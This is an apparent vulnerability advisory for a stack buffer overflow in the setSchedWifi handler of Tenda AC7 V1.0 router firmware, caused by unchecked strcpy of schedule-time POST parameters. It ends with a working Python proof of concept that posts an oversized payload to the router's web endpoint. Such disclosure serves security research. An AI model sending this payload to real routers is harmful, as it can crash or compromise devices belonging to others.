## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 has a stack overflow vulnerability in the `setSchedWifi` function. The `sched_start_time, sched_end_time` variable receives the `schedStartTime, schedEndTime` parameter from a POST request and is later assigned to the `wlan_switch` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedStartTime, schedEndTime`, the statement `strcpy(wlan_switch->begin_time, sched_start_time); strcpy(wlan_switch->end_time, sched_end_time);` can cause a buffer overflow. The user-provided `schedStartTime, schedEndTime` can exceed the capacity of the `wlan_switch` array, triggering this security vulnerability.

![image-20240318162711282](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162711282.png)

![image-20240318162629776](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162629776.png)

![image-20240318162651098](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162651098.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

# data = {"schedWifiEnable":payload,"schedStartTime": 0}
data = {"schedWifiEnable":0,"schedStartTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318162946485](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162946485.png)
